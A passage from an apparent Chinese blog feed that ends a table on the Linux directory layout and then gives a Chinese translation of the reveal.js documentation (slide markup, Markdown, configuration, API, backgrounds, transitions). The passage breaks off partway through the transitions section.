前面执行的。接着就是相应的连接到 <code>/etc/init.d</code> 下面的文件名字了。</td></tr><tr><td><strong>/etc/rc0.d - /etc/rc6.d</strong></td><td>这里面也是一些连接文件，和 <code>/etc/rcS.d</code> 差不多。不同的是，这些只会在指定的 <code>runlevel</code> 下运行相应的描述。<code>0</code> 表示关机，<code>6</code> 表示重启。所有以 <code>K</code>开头的文件表示关闭，所有以 <code>S</code> 开头的文件表示重启。目前来讲，文件的命名方式和 <code>/etc/rcS.d</code> 是一样的。</td></tr><tr><td><strong>/bin，/sbin</strong></td><td>这里分别放着启动时所需要的普通程序和系统程序。很多程序在启动以后也很有用，它们放在这个目录下是因为它们经常要被其他程序调用。</td></tr><tr><td><strong>/usr</strong></td><td>这是一个很复杂、庞大的目录。除了上述目录之外，几乎所有的文件都存放在这下面。下面列举其中一些重要的子目录。</td></tr><tr><td><strong>/usr/X11R6，/usr/X11，/usr/Xfree86</strong></td><td>这里保存着X窗口系统所需要的文件，它的目录结构和 <code>/usr</code> 是一样的。</td></tr><tr><td><strong>/usr/bin</strong></td><td>二进制可执行文件存放的目录，这里放着绝大部分的应用程序。</td></tr><tr><td><strong>/usr/sbin</strong></td><td>这里放着绝大部分的系统程序。</td></tr><tr><td><strong>/usr/games</strong></td><td>游戏程序和相应的数据会放在这里。</td></tr><tr><td><strong>/usr/include</strong></td><td>这个目录保存着 <code>C</code> 和 <code>C++</code> 的头文件。</td></tr><tr><td><strong>/usr/lib</strong></td><td>启动时用不到的库文件都会放在这里。</td></tr><tr><td><strong>/usr/info</strong></td><td>这里保存着 <code>GNU Info</code> 程序所需要的数据。</td></tr><tr><td><strong>/usr/man</strong></td><td>这里保存着 <code>man</code> 程序所需要的数据。</td></tr><tr><td><strong>/usr/src</strong></td><td>这里保存着源代码文件。</td></tr><tr><td><strong>/usr/doc</strong></td><td>这里保存着各种文档文件。这些文件可以帮助你了解 <code>Linux</code>，解决问题和提供一些技巧。</td></tr><tr><td><strong>/usr/local</strong></td><td>这里保存着本地计算机所需要的文件。在用户进行远程访问的时候特别有意义。这个目录在有些 <code>Linux</code> 系统下就是一个单独的分区，存放一些这台机子所属的那个用户的文件。里面的结构和 <code>/usr</code> 是一样的。</td></tr><tr><td><strong>/usr/shared，/usr/share</strong></td><td>这里保存着各种共享文件。</td></tr></tbody></table><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[reveal.js（HTML 演示文稿）中文文档]]></title>
      <url>/2016/09/reveal-js-cn-document/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>最近发现了一个可以用 HTML+CSS3 就能做出一份优美的 PPT 的 JavaScript 框架（reveal.js），但是我并没有找到该框架的中文帮助文档，所以在这里将提供中文帮助文档（本人的英文水平并不是很好，所以客官们凑合着看，顺便添加一些相关内容）<a id="more"></a></p><h1 id="英文帮助文档地址"><a href="#英文帮助文档地址" class="headerlink" title="英文帮助文档地址"></a>英文帮助文档地址</h1><blockquote><p><a href="//github.com/hakimel/reveal.js/#online-editor">reveal.js 英文帮助文档</a></p></blockquote><h1 id="reveal-js-介绍"><a href="#reveal-js-介绍" class="headerlink" title="reveal.js 介绍"></a>reveal.js 介绍</h1><h2 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h2><ul><li>一个使用 <code>HTML</code> 轻松创建精美的演示文稿框架，你只要有一个支持 <code>CSS 3D</code> 切换的浏览器。。<a href="//lab.hakim.se/reveal-js/">点击查看 demo</a></li><li><code>reveal.js</code> 配备了广泛的功能，包括嵌套幻灯片，<code>Markdown</code> 内容，<code>PDF</code> 导出，演讲笔记和 <code>JavaScript API</code>。还有一个全功能的可视化编辑器和平台：<a href="//slides.com/?ref=github">slides.com</a>。</li></ul><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>支持标签来区分每一页幻灯片</li><li>可以使用 <code>Markdown</code> 来写内容</li><li>支持 <code>PDF</code> 的导出</li><li>支持演说注释</li><li>提供 <code>JavaScript API</code> 来控制页面</li><li>提供了多个默认主题和切换方式</li></ul><h2 id="幻灯片实现步骤"><a href="#幻灯片实现步骤" class="headerlink" title="幻灯片实现步骤"></a>幻灯片实现步骤</h2><ol><li>从 <a href="//github.com/hakimel/reveal.js/">reveal.js</a> 上下载压缩包，并解压</li><li>进入 <code>reveal.js</code> 文件夹，直接修改 <code>index.html</code> 文件就可以</li></ol><h2 id="在线编辑"><a href="#在线编辑" class="headerlink" title="在线编辑"></a>在线编辑</h2><blockquote><p>演示文档是使用 HTML 或者 Markdown 编写的，如果你们更喜欢图形界面的在线编辑器，点击 <a href="//slides.com?ref=github">//slides.com</a> 尝试一下。</p></blockquote><h1 id="写法说明"><a href="#写法说明" class="headerlink" title="写法说明"></a>写法说明</h1><h2 id="HTML-实现"><a href="#HTML-实现" class="headerlink" title="HTML 实现"></a>HTML 实现</h2><p>幻灯片的内容需要包含在 <code>&lt;div class=&quot;reveal&quot;&gt; &lt;div class=&quot;slides&quot;&gt;</code> 的标签中。</p><p>一个 <code>section</code> 是一页幻灯片。当 <code>section</code> 包含在 <code>section</code> 中时，是一个纵向的幻灯片。实际上就是 <code>.reveal &gt; .slides &gt; section</code> 这样子结构的。</p><p>怎么理解呢？ 可以这样理解：横向的幻灯片代表一章，纵向的幻灯片代表一章中的一节。那么横向的幻灯片在播放时是左右切换的，而纵向的幻灯片是上下切换的。</p><p><code>For Example:</code></p><pre><code class="html">&lt;html&gt;
  &lt;head&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/reveal.css&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/theme/white.css&quot;&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class=&quot;reveal&quot;&gt;
      &lt;div class=&quot;slides&quot;&gt;
        &lt;section&gt;Slide 1&lt;/section&gt;
        &lt;section&gt;Slide 2&lt;/section&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;script src=&quot;js/reveal.js&quot;&gt;&lt;/script&gt;
    &lt;script&gt;
      Reveal.initialize();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre><h3 id="HTML-实现内容"><a href="#HTML-实现内容" class="headerlink" title="HTML 实现内容"></a>HTML 实现内容</h3><h4 id="标题和正文"><a href="#标题和正文" class="headerlink" title="标题和正文"></a>标题和正文</h4><p><code>section</code> 中的内容就是幻灯片的内容，你可以使用 <code>h2</code> 标签表示标题, <code>p</code> 表示内容。需要改变颜色的只需 <code>style=“color: ”</code>。</p><p>当某一页需要特殊背景色，可以使用 <code>data-background</code> 在 <code>section</code> 上设置, <code>data-background-transition</code> 表示背景的过渡效果。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section data-background-transition=&quot;zoom&quot; data-background=&quot;#dddddd&quot;&gt;
&lt;section&gt;
</code></pre><p>如果需要正文一段一段出现。可以使用 <code>fragment</code>。</p><p><code>For Example:</code></p><pre><code class="html">&lt;p class=&quot;fragment&quot;&gt;&lt;/p&gt;
</code></pre><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p><code>reveal.js</code> 使用 <code>highlight.js</code> 来支持代码高亮。可以直接写 <code>code</code> 标签来实现, <code>data-trim</code> 表示去除多余的空格。</p><p><code>For Example:</code></p><pre><code class="html">&lt;pre&gt;
  &lt;code data-trim&gt;
    console.log(&#39;hello reveal.js!&#39;);
  &lt;/code&gt;
&lt;/pre&gt;
</code></pre><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>在演示文稿里可能会用到注释，对于注释，可以通过 <code>&lt;aside class=&quot;notes&quot;&gt;</code> 来实现。</p><p><code>For Example:</code></p><pre><code class="html">&lt;aside class=&quot;notes&quot;&gt;
  &lt;!-- 这里是注释。 --&gt;
&lt;/aside&gt;
</code></pre><p>在幻灯片页面，按下 <code>s</code> 键，就可以调出注释页面，注释页面包含了当前幻灯片，下一章幻灯片，注释，以及幻灯片播放时间。</p><h2 id="Markdown-实现"><a href="#Markdown-实现" class="headerlink" title="Markdown 实现"></a>Markdown 实现</h2><p><code>reveal.js</code> 不仅支持 <code>html</code> 表示来实现内容， 还可以通过 <code>Markdown</code> 来实现内容。使用 <code>Markdown</code> 实现内容时，需要对 <code>section</code> 标示添加 <code>data-markdown</code> 属性，然后将 <code>Markdown</code> 内容写到一个 <code>text/template</code> 脚本中。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section data-markdown&gt;
  &lt;script type=&quot;text/template&quot;&gt;
    ## Page title

    A paragraph with some text and a [link](//hakim.se).
  &lt;/script&gt;
&lt;/section&gt;
</code></pre><h3 id="背景色"><a href="#背景色" class="headerlink" title="背景色"></a>背景色</h3><p><code>fragment</code> 功能的实现，可以通过注释来实现。 这是一个特殊的语法（在 HTML 中注释）。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section data-markdown&gt;
  &lt;script type=&quot;text/template&quot;&gt;
    &lt;!-- .slide: data-background=&quot;#ff0000&quot; --&gt;
    - Item 1 &lt;!-- .element: class=&quot;fragment&quot; data-fragment-index=&quot;2&quot; --&gt;
    - Item 2 &lt;!-- .element: class=&quot;fragment&quot; data-fragment-index=&quot;1&quot; --&gt;
  &lt;/script&gt;
&lt;/section&gt;
</code></pre><h3 id="外置-Markdown-文件"><a href="#外置-Markdown-文件" class="headerlink" title="外置 Markdown 文件"></a>外置 Markdown 文件</h3><p><code>reveal.js</code> 可以引用一个外置的 <code>Markdown</code> 文件来解析。<code>data-charset</code> 属性是可选的，它指定加载外部文件时使用的字符集。</p><p>当在本地使用，此功能要求 <code>reveal.js</code> 从本地 <code>Web</code> 服务器中运行。本地 <code>Web</code> 服务器推荐使用 <code>Node.js</code>。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section data-markdown=&quot;example.md&quot;
         data-separator=&quot;^\n\n\n&quot;
         data-separator-vertical=&quot;^\n\n&quot;
         data-separator-notes=&quot;^Note:&quot;
         data-charset=&quot;iso-8859-15&quot;&gt;
&lt;/section&gt;
</code></pre><h3 id="分页实现"><a href="#分页实现" class="headerlink" title="分页实现"></a>分页实现</h3><p>一个 <code>Markdown</code> 文件中可以连续包含多个章内容。可以在 <code>section</code> 中通过属性 <code>data-separator</code>, <code>data-separator-vertical</code> 来划分章节。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section data-separator=&quot;---&quot; data-separator-vertical=&quot;--&quot;  &gt;
  &lt;script type=&quot;text/template&quot;&gt;
    # 主题1
    - 主题1-内容1
    - 主题1-内容2
    --
    ## 主题1-内容1
    内容1-细节1
    --
    ## 主题1-内容2
    内容1-细节2
    ---
    # 主题2
  &lt;/script&gt;
&lt;/section&gt;
</code></pre><h2 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h2><p>对 <code>section</code> 添加 <code>data-separator-notes=&quot;^Note:&quot;</code> 属性，就可以指定 <code>Note:</code> 后面的内容为当前幻灯片的注释。</p><p><code>For Example:</code></p><pre><code class="markdown"># Title
## Sub-title

Here is some content...

Note:
This will only display in the notes window.
</code></pre><h1 id="基础配置项"><a href="#基础配置项" class="headerlink" title="基础配置项"></a>基础配置项</h1><p>在页面的最后，你需要初始化一些配置项，请注意，所有的配置值是可选的。以下指定的内容，是默认的配置值，可以根据需求修改。</p><p><code>Example Configuration:</code></p><pre><code class="javascript">Reveal.initialize({
  // 是否在右下角展示控制条
  controls: true,

  // 是否显示演示的进度条
  progress: true,

  // 是否显示当前幻灯片的页数编号，也可以使用代码 “slideNumber: &#39;c/t&#39;” ，表示当前页/总页数。
  slideNumber: false,

  // 是否将每个幻灯片改变加入到浏览器的历史记录中去
  history: false,

  // 是否启用键盘快捷键来导航
  keyboard: true,

  // 是否启用幻灯片的概览模式，可使用 &quot;Esc&quot; 或 &quot;o&quot; 键来切换概览模式
  overview: true,

  // 是否将幻灯片垂直居中
  center: true,

  // 是否在触屏设备上启用触摸滑动切换
  touch: true,

  // 是否循环演示
  loop: false,

  // 是否将演示的方向变成 RTL，即从右往左
  rtl: false,

  // 是否每次演示的时候，随机幻灯片的顺序
  shuffle: false,

  // 全局开启和关闭碎片。
  fragments: true,

  // 标识演示文稿是否在嵌入模式中运行，即包含在屏幕的有限部分中的
  embedded: false,

  // 标识当问号键被点击的时候是否应该显示一个帮助的覆盖层
  help: true,

  // 标识演讲者备注标志是否让所有观看者可见
  showNotes: false,

  // 两个幻灯片之间自动切换的时间间隔（毫秒）
  // 当设置成 0 的时候则禁止自动切换
  // 该值可以被幻灯片上的 “data-autoslide” 属性覆盖
  autoSlide: 0,

  // 当遇到用户输入的时候停止自动切换
  autoSlideStoppable: true,

  // 当自动滑动时，使用此方法进行导航。
  autoSlideMethod: Reveal.navigateNext,

  // 是否启用通过鼠标滚轮来导航幻灯片
  mouseWheel: false,

  // 是否在移动设备上隐藏地址栏
  hideAddressBar: true,

  // 是否在一个弹出的 iframe 中打开幻灯片中的链接
  previewLinks: false,

  // 切换过渡效果
  transition: &#39;default&#39;, // none/fade/slide/convex/concave/zoom

  // 过渡速度
  transitionSpeed: &#39;default&#39;, // default/fast/slow

  // 全屏幻灯片背景的过渡效果
  backgroundTransition: &#39;default&#39;, // none/fade/slide/convex/concave/zoom

  // 加载除当前可见的幻灯片之外的幻灯片数量
  viewDistance: 3,

  // 视差背景图片
  parallaxBackgroundImage: &#39;&#39;,
  // e.g. &#39;//s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg&#39;

  // 视差背景尺寸
  parallaxBackgroundSize: &#39;&#39;, // CSS syntax, e.g. &quot;2100px 900px&quot;

  // 移动视差背景（水平和垂直）滑动变化的数量, 例如 100
  // - 除了指定自动计算
  // - 设置为 0 时，禁止沿轴运动
  parallaxBackgroundHorizontal: null,
  parallaxBackgroundVertical: null
});
</code></pre><p>这些配置使用 <code>configure</code> 方法将会被更新。</p><p><code>For Example:</code></p><pre><code class="javascript">// 关闭自动切换
Reveal.configure({ autoSlide: 0 });

// 开启每 5 秒自动切换一次
Reveal.configure({ autoSlide: 5000 });
</code></pre><h1 id="演示文稿的大小"><a href="#演示文稿的大小" class="headerlink" title="演示文稿的大小"></a>演示文稿的大小</h1><p>所有的演示稿都有一个正常大小，这是他们所撰写的分辨率。该框架统一在此基础上自动缩放并规模演示，确保一切都适合任何于给定的屏幕上。</p><p>见下文的相关的大小配置选项，包括默认值的列表。</p><p><code>Example Configuration:</code></p><pre><code class="javascript">Reveal.initialize({
  ...

  // 演示稿的“正常”的大小。
  // 当演示稿被缩放时，将会适应不同的分辨率，而宽高比也将会被保留。
  // 可以用百分比单位指定。
  width: 960,
  height: 700,

  // 显示大小应该考虑到在内容的外围保留一些空白。
  margin: 0.1,

  // 应用到内容的最大最小的设置项
  minScale: 0.2,
  maxScale: 1.5
});
</code></pre><h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><p><code>Reveal.js</code> 不依赖于任何第三方的脚本，但一些可选库默认被包含。这些库在它们被加载时出现。</p><p><code>For Example:</code></p><pre><code class="javascript">Reveal.initialize({
  dependencies: [
    // 完全实现跨浏览器：classList
    // https://github.com/eligrey/classList.js/
    {
      src: &#39;lib/js/classList.js&#39;,
      condition: function() {
        return !document.body.classList;
      }
    },

    // 在 section 标签中解读 Markdown
    {
      src: &#39;plugin/markdown/marked.js&#39;,
      condition: function() {
        return !!document.querySelector( &#39;[data-markdown]&#39; );
      }
    },
    {
      src: &#39;plugin/markdown/markdown.js&#39;,
      condition: function() {
        return !!document.querySelector( &#39;[data-markdown]&#39; );
      }
    },

    // 在 code 标签中高亮代码
    {
      src: &#39;plugin/highlight/highlight.js&#39;,
      async: true,
      callback: function() {
        hljs.initHighlightingOnLoad();
      }
    },

    // 按住 Alt+点击 实现放大和缩小
    {
      src: &#39;plugin/zoom-js/zoom.js&#39;,
      async: true
    },

    // 演讲者备注
    {
      src: &#39;plugin/notes/notes.js&#39;,
      async: true
    },

    // MathJax
    {
      src: &#39;plugin/math/math.js&#39;,
      async: true
    }
  ]
});
</code></pre><p>你可以使用相同的语法添加自己的扩展。以下属性可用于每个依赖的对象当中：</p><ul><li><strong>src:</strong> 脚本加载的路径。</li><li><strong>async:</strong> 是否异步，可选标志。本是否在 reveal.js 之后开始加载，默认值为 false。</li><li><strong>callback:</strong> 回调方法，可选方法。当脚本加载是执行。</li><li><strong>condition:</strong> 返回条件 ，可选方法。为要加载的脚本返回 true。</li></ul><h1 id="Ready-事件"><a href="#Ready-事件" class="headerlink" title="Ready 事件"></a>Ready 事件</h1><p>当 <code>reveal.js</code> 已加载了所有非异步的依赖，并准备开始导航时被 <code>ready</code> 事件被触发。 要检查 <code>reveal.js</code> 是否已经 <code>ready</code>，你可以调用 <code>Reveal.isReady()</code> 方法。</p><p><code>For Example:</code></p><pre><code class="javascript">Reveal.addEventListener( &#39;ready&#39;, function( event ) {
  // event.currentSlide, event.indexh, event.indexv
} );
</code></pre><h1 id="自动滑动"><a href="#自动滑动" class="headerlink" title="自动滑动"></a>自动滑动</h1><p>演示文稿可以配置为通过自动滑动，而无需用户的任何输入。为了启用这个，你需要告诉框架幻灯片之间应该间隔多少毫秒进行切换。</p><p><code>For Example:</code></p><pre><code class="javascript">// 5 秒切换间隔
Reveal.configure({
  autoSlide: 5000
});
</code></pre><p>当启用时，会出现让用户可以暂停和恢复自动滑动的控件。另外，滑动可以按键盘上 <code>A</code> 键进行恢复和暂停。用户开始手动导航时就会自动暂停滑动。你可以通过 <code>reveal.js</code> 的配置项指定禁用控件：<code>autoSlideStoppable: false</code>。</p><p>你也可以在幻灯片上设置 <code>data-autoslide</code> 属性进行覆盖。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section data-autoslide=&quot;2000&quot;&gt;
  &lt;p&gt;After 2 seconds the first fragment will be shown.&lt;/p&gt;
  &lt;p class=&quot;fragment&quot; data-autoslide=&quot;10000&quot;&gt;
    After 10 seconds the next fragment will be shown.
  &lt;/p&gt;
  &lt;p class=&quot;fragment&quot;&gt;
    Now, the fragment is displayed for 2 seconds before the next slide is shown.
  &lt;/p&gt;
&lt;/section&gt;
</code></pre><p>要覆盖用于当自动滑动导航的方法，你可以指定 <code>autoSlideMethod</code> 的设置项。市值只能沿着头层导航而忽略垂直滑动，这里可以设置为：<code>Reveal.navigateRight</code>。</p><p>每当自动幻灯片模式恢复或者暂停时，<code>autoslideresumed</code> 和 <code>autoslidepaused</code> 事件会被释放。</p><h1 id="键盘绑定"><a href="#键盘绑定" class="headerlink" title="键盘绑定"></a>键盘绑定</h1><p>如果你不满意任何默认键盘绑定的，你可以使用 <code>keyboard</code> 配置选项来覆盖它们。</p><p><code>For Example:</code></p><pre><code class="javascript">Reveal.configure({
  keyboard: {
    13: &#39;next&#39;, // 按下 Enter 键切入下一张幻灯片
    27: function() {}, // 当 Esc 键被按下时执行的方法
    32: null // 当按下 SPACE 键时没有做任何事情（即禁用 reveal.js 默认绑定）
  }
});
</code></pre><h1 id="触摸导航"><a href="#触摸导航" class="headerlink" title="触摸导航"></a>触摸导航</h1><p>你可以通过在任何支持触摸的设备上滑动来演示导航。支持水平和垂直滑动实现幻灯片之间切换。如果你希望禁用这个功能，可以在初始化 <code>reveal.js</code>设置：<code>touch: false</code>。</p><p>如果有你的内容的某些部分仍然可以访问触摸事件，你需要在元素中添加 <code>data-prevent-swipe</code> 属性来突出这个。一个非常有用的元素需要被滚动是个常见的例子。</p><h1 id="延迟加载"><a href="#延迟加载" class="headerlink" title="延迟加载"></a>延迟加载</h1><p>在演示文稿时，大量的媒体文件或者 <code>iframe</code> 里的内容，被延迟加载是很重要的。延迟加载意味着 <code>reveal.js</code> 只会加载当前幻灯片最接近的几张幻灯片内容。被预加载的幻灯片是由配置项中的 <code>viewDistance</code> 的值所决定的。</p><p>要启用延迟加载，你需要在 <code>data-src</code> 中改变 <code>src</code> 属性。这是支持 <code>image</code>,<code>video</code>,<code>audio</code>和 <code>iframe</code> 元素。当包含不再长时间可见的幻灯片，延时加载的 <code>iframes</code> 将会被卸载。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section&gt;
  &lt;img data-src=&quot;image.png&quot;&gt;
  &lt;iframe data-src=&quot;//hakim.se&quot;&gt;&lt;/iframe&gt;
  &lt;video&gt;
    &lt;source data-src=&quot;video.webm&quot; type=&quot;video/webm&quot;&gt;
    &lt;source data-src=&quot;video.mp4&quot; type=&quot;video/mp4&quot;&gt;
  &lt;/video&gt;
&lt;/section&gt;
</code></pre><h1 id="API"><a href="#API" class="headerlink" title="API"></a>API</h1><p><code>Reveal</code> 对象公布了 <code>JavaScript API</code> 用来控制导航和阅读状态。</p><p><code>JavaScript API</code></p><pre><code class="javascript">// 导航
Reveal.slide( indexh, indexv, indexf );
Reveal.left();
Reveal.right();
Reveal.up();
Reveal.down();
Reveal.prev();
Reveal.next();
Reveal.prevFragment();
Reveal.nextFragment();

// 随机幻灯片的顺序
Reveal.shuffle();

// 切换演示状态，通过 true/false 来控制 开/关
Reveal.toggleOverview();
Reveal.togglePause();
Reveal.toggleAutoSlide();

// 在运行时改变一个配置值
Reveal.configure({ controls: true });

// 返回当前的配置值
Reveal.getConfig();

// 获取当前演示文稿的规模，即大小
Reveal.getScale();

// 检索之前和当前幻灯片元素
Reveal.getPreviousSlide();
Reveal.getCurrentSlide();

Reveal.getIndices(); // { h: 0, v: 0 } }
Reveal.getProgress(); // 0-1
Reveal.getTotalSlides();

// 返回演讲者当前幻灯片的备注
Reveal.getSlideNotes();

// 返回当前状态
Reveal.isFirstSlide();
Reveal.isLastSlide();
Reveal.isOverview();
Reveal.isPaused();
Reveal.isAutoSliding();
</code></pre><h2 id="幻灯片更改事件"><a href="#幻灯片更改事件" class="headerlink" title="幻灯片更改事件"></a>幻灯片更改事件</h2><p><code>&#39;slidechanged&#39;</code> 事件在每次幻灯片滑动时被释放（无论什么状态）。这个事件对象包含当前幻灯片的索引值，以及之前和当前幻灯片的 <code>HTML</code> 节点作为参考。</p><p>一些库，如 <code>MathJax</code>（见 <a href="//github.com/hakimel/reveal.js/issues/226">#226</a>）,可以获取幻灯片的变化和显示状态带来的困惑。很多时候，可以在回调中通过调用更新或者给予方法来确立。</p><p><code>For Example:</code></p><pre><code class="javascript">Reveal.addEventListener( &#39;slidechanged&#39;, function( event ) {
  // event.previousSlide, event.currentSlide, event.indexh, event.indexv
} );
</code></pre><h2 id="演示状态"><a href="#演示状态" class="headerlink" title="演示状态"></a>演示状态</h2><p>演示文稿的当前状态可以通过使用的 <code>getState</code> 方法获取。<code>state</code> 对象包含着后面所有演示所需的信息，因此它第一次被称为 <code>getSate</code>。这有一点像快照。它可以很容易地字符串化和持久化或通过网络发送一个简单的对象。</p><p><code>For Example:</code></p><pre><code class="javascript">Reveal.slide( 1 );
// we&#39;re on slide 1

var state = Reveal.getState();

Reveal.slide( 3 );
// we&#39;re on slide 3

Reveal.setState( state );
// we&#39;re back on slide 1
</code></pre><h2 id="幻灯片状态"><a href="#幻灯片状态" class="headerlink" title="幻灯片状态"></a>幻灯片状态</h2><p>如果你在幻灯片的 <code>section</code> 中设置 <code>data-state=&quot;somestate&quot;</code>，当幻灯片被打开时，<code>&quot;somestate&quot;</code> 将会应用一个 <code>class</code> 在文档元素上。这允许你使用广泛的样式变化应用到基于活动的幻灯片页面。</p><p>此外，你还可以通过 <code>JavaScript</code> 监听这些变化状态。</p><p><code>For Example:</code></p><pre><code class="javascript">Reveal.addEventListener( &#39;somestate&#39;, function() {
    // TODO: Sprinkle magic
}, false );
</code></pre><h2 id="幻灯片背景"><a href="#幻灯片背景" class="headerlink" title="幻灯片背景"></a>幻灯片背景</h2><p>幻灯片默认包含在屏幕的有限范围之内，这允许其适应任何的显示屏幕并且均匀的缩放。你可以在 <code>section</code> 元素上添加 <code>data-background</code> 属性，定义幻灯片区域之外的整页背景。拥有四种不同类型的背景支持：<code>color</code>, <code>image</code>, <code>video</code> 和 <code>iframe</code>。</p><h3 id="颜色背景"><a href="#颜色背景" class="headerlink" title="颜色背景"></a>颜色背景</h3><p>所有 <code>CSS</code> 颜色都将支持，如 <code>rgba()</code> 或者 <code>hsl()</code>。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section data-background-color=&quot;#ff0000&quot;&gt;
  &lt;h2&gt;Color&lt;/h2&gt;
&lt;/section&gt;
</code></pre><h3 id="图片背景"><a href="#图片背景" class="headerlink" title="图片背景"></a>图片背景</h3><p>默认情况下，背景图片将会缩放至覆盖整个页面。可用选项：</p><table><thead><tr><th>Attribute</th><th>Default</th><th>Description</th></tr></thead><tbody><tr><td>data-background-image</td><td></td><td>显示图像的 URL 地址。当幻灯片打开时，GIF 重新启动。</td></tr><tr><td>data-background-size</td><td>cover</td><td>在 MDN 上查看 <a href="//developer.mozilla.org/docs/Web/CSS/background-size">background-size</a></td></tr><tr><td>data-background-position</td><td>center</td><td>在 MDN 上查看 <a href="//developer.mozilla.org/docs/Web/CSS/background-position">background-position</a></td></tr><tr><td>data-background-repeat</td><td>no-repeat</td><td>在 MDN 上查看 <a href="//developer.mozilla.org/docs/Web/CSS/background-repeat">background-repeat</a></td></tr></tbody></table><p><code>For Example:</code></p><pre><code class="html">&lt;section data-background-image=&quot;//example.com/image.png&quot;&gt;
  &lt;h2&gt;Image&lt;/h2&gt;
&lt;/section&gt;
&lt;section data-background-image=&quot;//example.com/image.png&quot;
         data-background-size=&quot;100px&quot;
         data-background-repeat=&quot;repeat&quot;&gt;
  &lt;h2&gt;This background image will be sized to 100px and repeated&lt;/h2&gt;
&lt;/section&gt;
</code></pre><h3 id="视频背景"><a href="#视频背景" class="headerlink" title="视频背景"></a>视频背景</h3><p>在幻灯片背后上自动播放全尺寸的视频。</p><table><thead><tr><th>属性</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>data-background-video</td><td></td><td>单个视频源，或者使用逗号分隔的视频源列表</td></tr><tr><td>data-background-video-loop</td><td>false</td><td>设置视频是否重复播放</td></tr><tr><td>data-background-video-muted</td><td>false</td><td>设置视频是否静音</td></tr></tbody></table><p><code>For Example:</code></p><pre><code class="html">&lt;section
 data-background-video=&quot;//s3.amazonaws.com/static.slid.es/site/homepage/v1/homepage-video-editor.mp4,//s3.amazonaws.com/static.slid.es/site/homepage/v1/homepage-video-editor.webm&quot;
 data-background-video-loop
 data-background-video-muted&gt;
  &lt;h2&gt;Video&lt;/h2&gt;
&lt;/section&gt;
</code></pre><h3 id="Iframe-背景"><a href="#Iframe-背景" class="headerlink" title="Iframe 背景"></a>Iframe 背景</h3><p>嵌入了网页作为背景。请注意，由于 <code>iframe</code> 是在背景层，即幻灯片的后面，我们是不可能与嵌入式网页交互。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section data-background-iframe=&quot;//slides.com&quot;&gt;
  &lt;h2&gt;Iframe&lt;/h2&gt;
&lt;/section&gt;
</code></pre><h3 id="背景切换"><a href="#背景切换" class="headerlink" title="背景切换"></a>背景切换</h3><p>默认情况下，使用一个渐变的动画背景进行过渡。这可以在 <code>Reveal.initialize()</code> 申明 <code>backgroundTransition: &#39;slide&#39;</code> 改变滑动过渡效果，另外，你可以在 <code>section</code> 中指定 <code>data-background-transition</code>，衣服该指定的背景过渡。</p><h2 id="视差背景"><a href="#视差背景" class="headerlink" title="视差背景"></a>视差背景</h2><p>如果你想使用视差滚动背景，可以在 <code>reveal.js</code> 初始化设置下面前两项（另外两个是可选的）。</p><p><code>Example Configuration:</code></p><pre><code class="javascript">Reveal.initialize({
  // 视差背景图片地址
  parallaxBackgroundImage: &#39;&#39;,
  // e.g. &quot;//s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg&quot;

  // 视差背景图片大小
  parallaxBackgroundSize: &#39;&#39;,
  // CSS syntax, e.g. &quot;2100px 900px&quot;
  // 目前只有像素支持（不要使用百分比或者 auto）

  // 每张幻灯片的背景视差移动像素数
  // - 除了指定自动计算
  // - 设置为 0 时，禁止沿轴运动
  parallaxBackgroundHorizontal: null,
  parallaxBackgroundVertical: null
});
</code></pre><h2 id="幻灯片切换"><a href="#幻灯片切换" class="headerlink" title="幻灯片切换"></a>幻灯片切换</h2><p>全局使用 <code>transition</code> 配置值设置演示文稿的切换方法。你可以通过添加 <code>data-transition</code> 属性来覆盖指定的全局幻灯片切换效果。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section data-transition=&quot;zoom&quot;&gt;
  &lt;h2&gt;This slide will override the presentation transition and zoom!&lt;/h2&gt;
&lt;/section&gt;

&lt;section data-transition-speed=&quot;fast&quot;&gt;
  &lt;h2&gt;Choose from three transition speeds: default, fast or slow!&lt;/h2&gt;
&lt;/section&gt;
</code></pre><p>你也可以为进出同一张幻灯片使用不同的切换效果。</p><p><code>For Example:</code></p><pre><code class="html">&lt;section data-transition=&quot;slide&quot;&gt;
  The train goes on …
&lt;/section&gt;
&lt;section data-transition=&quot;slide&quot;&gt;
  and on …
&lt;/section&gt;
&lt;section data-transition=&quot;slide-in fade-out&quot;&gt;
  and stops.
&lt;/section&gt;
&lt;section data-transition=&quot;fade-in slide-out&quot;&gt;
  (Passengers entering and leaving)
&lt;/section&gt;
&lt;section data-transition=&quot;slide&quot;&gt;
  And it starts again.
&lt;/section&gt;
